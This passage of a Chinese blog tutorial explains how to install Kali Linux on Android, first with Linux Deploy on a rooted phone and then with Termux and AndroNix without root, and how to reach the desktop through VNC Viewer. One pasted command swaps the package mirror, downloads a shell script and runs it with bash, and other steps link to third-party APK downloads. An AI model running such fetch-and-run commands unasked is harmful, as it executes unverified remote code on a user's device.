src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvd2UxWTlsTEZhbVBOaDJqLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143431.png"></p><p><strong>文件系统</strong>，现在最新的是 <strong>ext4</strong>，是 Linux 下常用的文件系统，类似于 Windows 里的 <strong>NTFS</strong> 文件系统，或者 U盘使用的 <strong>FAT32</strong> 文件系统，所以这里选择默认的就好：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvQ3ZMU2ZNdUk3S2FjNFZ3LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20200110-220704.png"></p><p><strong>用户名</strong>，即登录系统的账户名（以 test 为例）：</p><p><img src="https://img-blog.csdnimg.cn/20200111172759682.png" alt="在这里插入图片描述"></p><p><strong>用户密码</strong>，上面的账户对应的密码（也以 test 为例）：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvR3ZrZWJzMnVuSzNmcVdSLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143549.png"></p><p><strong>特权用户</strong>，这里填写超级用户 <strong>root</strong>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvcFlLdGdCcWlGWm9QMWxlLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143512.png"></p><p><strong>本地化</strong>，即系统使用的语言，先使用默认的 <strong>C</strong>（英语），想要中文可以后期改：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvOU1qNGlxN3RhMUhOWXZyLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143530.png"></p><p><strong>DNS、Network trigger、Power trigger</strong> 这三项可以不用管，让它们空着；</p><p><strong>初始化</strong>，启用选项可以不用勾上；</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvQXJkTnhPOFV1UnpDWFNxLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20200110-220725.png"></p><p><strong>挂载</strong>，即挂载 Android 上的资源，类似于一个文件中转站，设置为手机系统中的一个文件夹，这样这个文件夹中的内容 Linux 系统和手机系统都可以访问，也就实现了互传文件的功能，我们可以勾上：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvWUhPM2haV0E0R3Z6c0xJLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20200110-220746.png"></p><p>点击 <strong>挂载点列表</strong> 后进去，点右上角的加号，添加一个挂载点；第一行填写你设置为文件中转站的目录（该文件夹自己事先创建好）的绝对路径，比如该文件夹创建在 SD 卡根目录，名为 share，那就写 <code>/sdcard/share</code>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvR3VOZW9ZTDRuaDFiTVNILmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143642.png"></p><p>点确定后完成创建，返回：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvU0I1UHZlOHpXNERqbkxFLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143654.png"></p><p><strong>SSH</strong>，即是否开启 Linux 系统的 ssh 服务，勾上后就可以在手机终端用 ssh 命令连接 Linux 系统，这里我们勾上，然后下面的 <strong>SSH 设置</strong> 使用默认的不用改：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUveFVlQ3dmUlhRS2txNTZCLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143722.png"></p><p><strong>声音服务</strong>，即 Linux 系统的声音在手机上播放，这里我们也勾上，设置用默认的不改：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvV0JVWE5Lb2JZa0p6TGFoLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143742.png"></p><p><strong>图形界面</strong>，这就是一个比较重要的设置了，因为一旦 Linux 系统在手机上安装好后，不安装图形桌面（类似于 Windows 的桌面）的话，就只能通过 ssh 进行命令行操作系统；勾选启用后，点击下面的 <strong>图形子系统</strong> 选项，会弹出以下选项：</p><p>一般选 VNC，另外两个选项后面介绍：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMjUvQnA4RWhtMVVqNUhJckFiLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143922.png"></p><p><strong>图形界面设置</strong>，对应上面的 VNC 结果，一般也是使用默认的不用改，了解选项含义的可以自行修改：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMjUvWnIySVhXUVI0OGphZVRFLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143932.png"></p><p><strong>桌面环境</strong>，即图形桌面环境的外观，这里我们选 <strong>Xfce</strong>：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMjUvRUZVT1FYOHJvcHVWZ0wxLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-144032.png"></p><p>下面也贴出几个选项对应的桌面外观截图，以供参考：</p><p><strong>Xterm</strong>（无图形桌面，只有 shell）:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvcU94RldHa1FBajFLdFl5LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142733.png"></p><p><strong>LXDE</strong>:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvTVU3TEpmbUJ0VDJZRjRzLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-143142.png"></p><p><strong>Xfce</strong>:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvT0VpalhKMXNmSHE4ejZtLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-144642.png"></p><p><strong>MATE</strong>:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvRnJQUUN3dGVPbGJjWDdmLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-144052.png"></p><p>配置结束，这里再提一下上面说过的 <strong>图形子系统</strong> 的另外两个选项，仅供参考；首先是 X11，熟悉 Linux 的应该了解这个选项，物理机（或虚拟机）安装的 Linux 桌面系统一般都是使用的 X11 的图形服务，选上后进入 <strong>图形界面设置</strong> 后是以下选项：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMjUvMkxxbUJNa1Z3bEYxS1JkLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143946.png"></p><p>不了解的可以按上图配置，另外，使用改选项需要安装图中所说的 <strong>Xserver XSDL</strong> 这个软件，可以去市场下载，或者使用下面的链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1AuC09-HzT9ZWEwBzV7dRxg提取码: swx5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装好后不用特意打开它，Linux 系统启动时它会被自动打开，运行（需等待一段时间，不要点屏幕）截图如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvd2tObFk1VkxQaE1JUXlaLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-144618.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvMW9qa0NyWjZmVVRjSExXLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-144622.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvZzQyRHlPNTd2a1RpRXRCLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-144625.png"></p><p>如果 <strong>图形子系统</strong> 选择 framebuffer 的话，<strong>图形界面设置</strong> 选项如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMjUvUVVuT1hBRjVUekdmMk1DLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-144016.png"></p><p>设置也是默认不变，只不过由于这种图形显示技术比较特殊（古老），笔者尝试并未成功，手机还多次卡死 -_-，所以保守派就不要轻易尝试了，自担风险；</p><h2 id="配置文件-1"><a href="#配置文件-1" class="headerlink" title="配置文件"></a>配置文件</h2><p>上面进行的配置会被保存到一个配置文件中，点击 Deploy 软件主界面左上角的菜单按钮，选择第一 <strong>配置文件</strong> 选项即可对配置文件经行修改，这是默认的配置：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvTTNIeEZZNWZoYkR1U0xLLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191217-221200.png"></p><p>右上角的三个按钮分别是<strong>新建、重命名、删除</strong>，例如对当前配置文件重命名：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvemFTMVF2TXl0Q0tOaUVQLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191217-221220.png"></p><p>或者新建一个：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvR0lWTGhNVXVyYlRYQ1dvLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191217-221301.png"></p><p>使用不同的配置来选择不同的系统，就可以实现一机安装多 linux 系统（手机存储足够前提下）；</p><h2 id="安装系统-2"><a href="#安装系统-2" class="headerlink" title="安装系统"></a>安装系统</h2><p>配置完毕，接下来就是安装系统了；首先回到软件主界面，点击右上角的菜单按钮：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvbUVQSnJpaHVueWpsNEJ2LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-135609.png"></p><p>然后点击第一个 <strong>安装</strong> 按钮，然后弹出窗口中点 OK 确定：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvdmprNHdmcEZzYmhybHRVLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-135646.png"></p><p>随后软件就开始 Linux 系统的安装了，主界面会不断输出一些信息：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvdWs2MWFGZ1lqaHd5QVpwLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-135653.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvWm1pOWJTajdVSzRyREd6LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-140612.png"></p><p>操作系统较大，下载安装时间较长，一般用时在半小时左右，网速好的话会快一点；当输出信息如下图的最后一行时，则表示安装完成：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAveXBLdDZVajRaUXNmekY5LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-141624.png"></p><p>然后下一步本应是点击右上角菜单的配置按钮，但是这样会出现像下面这个的 <strong>问题</strong>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvdXhNVThCMkdpZHF5dGEzLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-141816.png"></p><p>也就是输出一堆 <code>skip</code>，这是因为在没有关闭系统的情况下进行配置，会使得系统不能正常配置，所以需要先点击底部菜单的停止按钮（以后出现 skip 输出数量较多时也这样操作）：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvWHNicmVNN3ppdlBCQzV1LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-141821.png"></p><p>然后点击确认，最后输出 <code>&lt;&lt;&lt; stop</code> 则表示停止成功：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvZEFVR1hCeTNxaXp3U2tZLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-141827.png"></p><p>这里再点击右上角菜单的配置选项，也需要等待一段时间：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvcFVPaExNQW5vNElmR3gzLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-141718.png"></p><p>配置结束后，点击启动按钮启动系统：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvdzlvYjNWZ2RqZlVwZW40LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-141724.png"></p><p>启动成功，都是 <code>done</code> 则表示正常启动，若 <code>skip</code> 较多则尝试停止后再启动（下图的 /dev/shm skip 可以不用管）：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvMjFvRmRCS3dJdnpjWTZHLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-141837.png"></p><h2 id="进入系统-1"><a href="#进入系统-1" class="headerlink" title="进入系统"></a>进入系统</h2><p>Linux 系统启动完毕，接下来就是进入图形桌面环境，当然，由于之前开启了 SSH 服务，所以也可以使用之前下载的 Terminal 终端软件进入 shell 环境，这里由于之前选择 VNC 作为图形子系统来配置的，所以这里就用 <strong>VNC Viewer</strong> 这个软件来进入图形桌面；</p><p>打开 <code>VNC Viewer</code> 这个软件，进入主界面：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvb1RmN25oenJzMkFVdGQzLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142011.png"></p><p>点击右下角的加号添加要连接的对象，这个软件本来是用于连接所有开有 VNC 服务的服务器的，由于我们把 Linux 系统安装在手机（即本地），所以地址填写本地地址：<code>127.0.0.1</code>，也可以写 <code>localhost</code>，一个意思，下面一行的名字随便写一个：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvTDc0ZnNiMzhXTUtHcG52LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142342.png"></p><p>然后点击 <code>create</code> 创建连接，进入如下界面：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvRHluRkpTbHoxT2lzWjJwLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20200110-180055.png"></p><p>需要注意的只有 <code>view only</code> 这个不要选上，就是字面意思，只读模式；点击 <code>CONNECT</code> 进行连接，会提示输入密码：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvRDFJc3FkZ21wSDlNZUVsLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142059.png"></p><p>密码就是之前在配置里面设置的用户密码，当时设置的是 <code>test</code>（之后记得自己修改密码），填上去，然后把记住密码勾上，再点击右上角的 <code>CONTINUE</code>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvQndNRjlINnBxTldSQUNLLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142048.png"></p><p>后面出现的安全提示不用管，取消勾选 <code>warn me every time</code>，再点击右上角的 <code>OK</code> 就可以进入系统了：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvS0IzWnZmZWt3UEp5dFNMLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142109.png"></p><p>初次使用软件进入有个教程，跟着做完就行了，忘记了按钮的意思就点右数第二个问号按钮查看就行了，下面再给出几张横屏的特写：</p><p><img src="https://img-blog.csdnimg.cn/20200111172929126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tOSUdIX1lVTg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvRGE5NnBoSm1idkx0c1NSLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142224.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvcVZLOG1ycGlGMnZPUXdhLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142237.png"></p><p>这里再提供一款输入法软件：<strong>Hacker’s Keyboard</strong>，翻译过来是黑客键盘，听着霸气，其实就是增加了计算机键盘中的 <strong>Ctrl, Shift, Tab, Alt</strong> 等键，因为常见手机输入法中不存在这几个键，在使用 Kali 系统时可以提供一些便利，自行搜索下载或使用以下链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1iPgSBmNYy9xzHfJg2aoaEg提取码: ydah<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也附上两张特写：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvMXNCQ2JaSmRjdFdhVlNtLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20200110-214651.png"></p><p>默认是横屏才出现特殊按键，可以自行在设置中修改：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvdW5nMTd4TE9zZVZGUjRKLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20200110-214733.png"></p><h2 id="关闭系统-2"><a href="#关闭系统-2" class="headerlink" title="关闭系统"></a>关闭系统</h2><p>不再使用系统后点右上角的叉号断开连接：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvQ3I2djUzekp1N2FjajFPLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142251.png"></p><p>回到主界面也会保存系统的快照，下次直接点击就能进去了：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvQ2JVU2g4MkRnQk93b2lzLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142352.png"></p><p>断开连接不代表系统关闭了，还要回到 Deploy 这个软件，点击底部的停止按钮：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvTkhjMXBMRVlBc0NxNXRHLnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142407.png"></p><p>如下图，则表示系统成功关闭了：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvU3g1dVhxWU5uektXQ2J2LnBuZw?x-oss-process=image/format,png" alt="Screenshot_20191219-142416.png"></p><p>下次要启动系统，就点击启动按钮，再用 VNC Viewer 连接就行了，切换不同的 Linux 系统，只需要切换到对应的配置文件就行了，<strong>注意</strong> 每次切换或修改配置，都需要点击右上角的 <strong>配置</strong> 按钮进行重新配置，只有在安装新系统时才需要点击 <strong>安装</strong> 按钮；</p><p>至此关于 root 环境下使用 Deploy 安装 Kali 系统的教程就结束了，关于 Deploy 中未提到的其他菜单功能，可以自行探索；</p><h1 id="非-ROOT-环境-1"><a href="#非-ROOT-环境-1" class="headerlink" title="非 ROOT 环境"></a>非 ROOT 环境</h1><p>当然，除去 root 玩家，总会存在那么一些手机厂商，让自家产品百试不得其 ROOT，让技术用户们又爱又恨-_-，所以这里也准备了非 ROOT 环境下的备选方案，当然，比起 ROOT 来说，确实会阉割部分功能，但主要功能都能用，所以建议能 ROOT 就不要退而求其次；</p><h2 id="主要软件-2"><a href="#主要软件-2" class="headerlink" title="主要软件"></a>主要软件</h2><h3 id="Termux-1"><a href="#Termux-1" class="headerlink" title="Termux"></a>Termux</h3><p>这是该方法的主角，这个软件类似于在手机中搭建一个 Linux 虚拟机，可以执行一些常用的 Linux 命令，与之前说的 <code>Terminal</code> 这个终端软件主要的区别就是该软件可以安装第三方软件包，就是熟悉的 <code>apt</code> 系列命令，很方便，因此功能也较为强大；可以在应用市场搜索下载，或者使用下面的链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1z1blrlhPxUcsbRlmGTkAYw取码: stye<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="AndroNix-1"><a href="#AndroNix-1" class="headerlink" title="AndroNix"></a>AndroNix</h3><p>这个软件用于提供常见 Linux 发行版本系统的下载，其实用过后发现就是提供系统的下载链接，然后跳转到 Termux 进行下载和安装，搜索下载或使用链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;177VOddzfaCXVoHb_duK5bA提取码: 7k65<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="安装系统-3"><a href="#安装系统-3" class="headerlink" title="安装系统"></a>安装系统</h2><p>首先安装 <strong>Termux</strong> 软件然后打开，会进入以下界面：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvdm90SlVGNWFsZDIzZzdzLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_184512_com.termux.jpg"></p><p>它是一个简单的 shell，可以运行一些常用命令，自行探究；</p><p>然后安装并打开 <strong>AndroNix</strong> 软件，主界面如下：</p><p><img src="https://img-blog.csdnimg.cn/20200111173001909.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tOSUdIX1lVTg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里还是以安装 Kali 系统为例，那么我们点击右上那个熟悉的 Kali 系统图标，进入以下界面，点击安装按钮：</p><p><img src="https://img-blog.csdnimg.cn/20200111173031189.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tOSUdIX1lVTg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>按照指示的步骤进行，先点击复制，命令会被复制到系统粘贴板：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvdjZyRlR5dWs0aURFTUNHLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_184556_studio.com.techriz.andronix.jpg"></p><blockquote><p>AndroNix 可能部分机型存在<strong>不兼容</strong>的情况，这里直接贴出这个软件复制到剪切板的内容，下一个步骤粘贴即可：</p><p>echo “deb <a href="https://termux.mentality.rip/termux-main">https://termux.mentality.rip/termux-main</a> stable main” &gt; $PREFIX/etc/apt/sources.list &amp;&amp; cat $PREFIX/etc/apt/sources.list &amp;&amp; pkg update -y &amp;&amp; pkg install wget curl proot tar -y &amp;&amp; wget <a href="https://raw.githubusercontent.com/AndronixApp/AndronixOrigin/master/Installer/Kali/kali-xfce.sh">https://raw.githubusercontent.com/AndronixApp/AndronixOrigin/master/Installer/Kali/kali-xfce.sh</a> -O kali-xfce.sh &amp;&amp; chmod +x kali-xfce.sh &amp;&amp; bash kali-xfce.sh</p></blockquote><p>然后我们切换到 <strong>Termux</strong> 这个软件，长按粘贴刚才复制的代码，内容如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvZkJieEt2U0g2VnVuTGNsLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_184637_com.termux.jpg"></p><p>然后按下回车后进行系统的下载和安装，同样需要一段时间；完成后，会在当前目录下生成几个新文件，如下图：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvcXROMlNqd1FXRUd5QmVLLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_184702_com.termux.jpg"></p><p>目录下的 <code>start-kali.sh</code> 文件就是我们安装的 Kali 系统的启动文件，所以我们输入命令 <code>./start-kali.sh</code> 启动系统：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvcU9DM2lQYlpURHY4VUF1LmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_184724_com.termux.jpg"></p><p>到这里我们的系统算是安装成功了；</p><h2 id="安装图形桌面-1"><a href="#安装图形桌面-1" class="headerlink" title="安装图形桌面"></a>安装图形桌面</h2><p>目前安装的 Kali 系统只能 shell 进行访问，接下来安装我们熟悉的图形桌面环境，所以我们手机切换回 <strong>AndroNix</strong> 这个软件，执行第二步，即择桌面系统，和之前一样，我们点击 <strong>XFCE</strong>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvVFpmUXRnU0RHQXFjOG5rLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_184611_studio.com.techriz.andronix.jpg"></p><p>这里同样是把代码复制到了系统粘贴板，需要切换到 Termux 并粘贴代码；需要 <strong>注意</strong> 的是，官方文件似乎没有描述清楚，这里是要再启动后的 Kali 系统环境下粘贴代码以安装图形桌面，也就是运行 <code>./start-kali.sh</code> 后再粘贴运行代码，而不是在 Termux 的默认环境下粘贴运行，如下图：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvM1pHbWFBUFFKcUY1WURyLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_184838_com.termux.jpg"></p><p>安装完后会提示设置连接密码，为了之后使用 <strong>VNC Viewer</strong> 进行连接：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvSFRiTUtlbjlyYWx0aVVvLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_190028_com.termux.jpg"></p><p>再次输入以确定：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvOXRIY0tEczZGemtTdzduLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_190036_com.termux.jpg"></p><p>然后会提示是否设置一个 view-only（只读模式）密码，这里我们不设置，输入 <strong>n</strong>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvNFczSUJWT1BZcGdtYmxFLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_190046_com.termux.jpg"></p><p>然后就配置完成，要访问 Kali 图形桌面就需要先启动 VNC 服务，启动服务的命令为 <code>vncserver-start</code>，停止的命令为 <code>vncserver-stop</code>，如下图；</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvUlgxeXVCbHNVTUNoNzNZLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_190113_com.termux.jpg"></p><p>会发现这两个命令类似 Deploy 中的启动和停止按钮，只不过它是同时启动系统和 vnc 服务罢了；接下来就输入命令启动 Kali 系统的 VNC 服务，会输出以下信息：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvTEdJYlpmQ01YMWd5Nk56LmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_190123_com.termux.jpg"></p><p>到这里服务就启动成功了，接下来就是和之前一样，使用  <strong>VNC Viewer</strong> 这个软件来连接图形桌面环境，新建一个连接：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvNWZMNER2ajlxem03R09KLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_191617_com.realvnc.viewer.android.jpg"></p><p>这里也是和之前唯一 <strong>不同</strong> 之处，即 Deploy 默认开启的 vnc 服务端口是 <strong>5900</strong>，同时 VNC Viewer 的默认端口也是 <strong>5900</strong>，所以之前只需要输入 <code>127.0.0.1</code> 就行了，但是 <code>vncserver-start</code> 开启服务的端口是 <strong>5901</strong> 起步，随开启数量而递增，所以在配置地址时需要指定端口，即地址设为：<code>127.0.0.1:5901</code>；</p><p>后面的步骤就和之前大致相同了：</p><p><img 